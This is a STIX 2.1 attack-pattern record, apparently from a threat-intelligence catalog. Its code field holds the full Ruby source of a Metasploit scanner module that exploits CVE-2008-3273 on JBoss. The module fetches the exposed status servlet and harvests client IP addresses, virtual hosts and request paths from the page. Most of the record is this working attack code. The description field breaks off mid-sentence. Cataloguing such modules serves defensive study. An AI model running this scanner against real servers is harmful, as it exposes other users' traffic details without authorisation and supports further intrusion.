{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5eb452d7-3780-448d-996c-6c21f30eb15d",
    "created": "2024-08-14T16:29:20.336689Z",
    "modified": "2024-08-14T16:29:20.336693Z",
    "name": "JBoss Status Servlet Information Gathering",
    "description": " This module queries the JBoss status servlet to collect sensitive",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jboss_status.rb",
            "external_id": "jboss_status.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3273"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2011/Sep/139"
        },
        {
            "source_name": "reference",
            "url": "https://owasp.org/www-pdf-archive/OWASP3011_Luca.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.slideshare.net/chrisgates/lares-fromlowtopwned"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'JBoss Status Servlet Information Gathering',\n      'Description' => %q{\n        This module queries the JBoss status servlet to collect sensitive\n        information, including URL paths, GET parameters and client IP addresses.\n        This module has been tested against JBoss 4.0, 4.2.2 and 4.2.3.\n      },\n      'References'  =>\n        [\n          ['CVE', '2008-3273'],\n          ['CVE', '2010-1429'], # regression\n          ['URL', 'https://seclists.org/fulldisclosure/2011/Sep/139'],\n          ['URL', 'https://owasp.org/www-pdf-archive/OWASP3011_Luca.pdf'],\n          ['URL', 'https://www.slideshare.net/chrisgates/lares-fromlowtopwned']\n        ],\n      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [ true,  'The JBoss status servlet URI path', '/status'])\n    ])\n  end\n\n  def run_host(target_host)\n    jpath = normalize_uri(target_uri.to_s)\n\n    @requests  = []\n\n    vprint_status(\"#{rhost}:#{rport} - Collecting data through #{jpath}...\")\n\n    res = send_request_raw({\n      'uri'    => jpath,\n      'method' => 'GET'\n    })\n\n    # detect JBoss application server\n    if res and res.code == 200 and res.body.match(/<title>Tomcat Status<\\/title>/)\n      http_fingerprint({:response => res})\n\n      html_rows = res.body.split(/<strong>/)\n      html_rows.each do |row|\n\n        #Stage      Time    B Sent  B Recv  Client  VHost   Request\n        #K  150463510 ms    ?       ?       1.2.3.4 ?       ?\n\n        # filter client requests\n        if row.match(/(.*)<\\/strong><\\/td><td>(.*)<\\/td><td>(.*)<\\/td><td>(.*)<\\/td><td>(.*)<\\/td><td nowrap>(.*)<\\/td><td nowrap>(.*)<\\/td><\\/tr>/)\n\n          j_src  = $5\n          j_dst  = $6\n          j_path = $7\n\n          @requests << [j_src, j_dst, j_path]\n        end\n      end\n    elsif res and res.code == 401\n      vprint_error(\"#{rhost}:#{rport} - Authentication is required\")\n      return\n    elsif res and res.code == 403\n      vprint_error(\"#{rhost}:#{rport} - Forbidden\")\n      return\n    else\n      vprint_error(\"#{rhost}:#{rport} - Unknown error\")\n      return\n    end\n\n    # show results\n    unless @requests.empty?\n      show_results(target_host)\n    end\n  end\n\n  def show_results(target_host)\n    print_good(\"#{rhost}:#{rport} JBoss application server found\")\n\n    req_table = Rex::Text::Table.new(\n      'Header'  => 'JBoss application server requests',\n        'Indent'  => 1,\n        'Columns' => ['Client', 'Vhost target', 'Request']\n    )\n\n    @requests.each do |r|\n      req_table << r\n      report_note({\n        :host  => target_host,\n        :proto => 'tcp',\n        :sname => (ssl ? 'https' : 'http'),\n        :port  => rport,\n        :type  => 'JBoss application server info',\n        :data  => \"#{rhost}:#{rport} #{r[2]}\"\n      })\n    end\n\n    print_line\n    print_line(req_table.to_s)\n  end\nend\n",
    "x_mitre_contributors": [
        "Matteo Cantoni <goony[at]nothink.org>",
        ""
    ]
}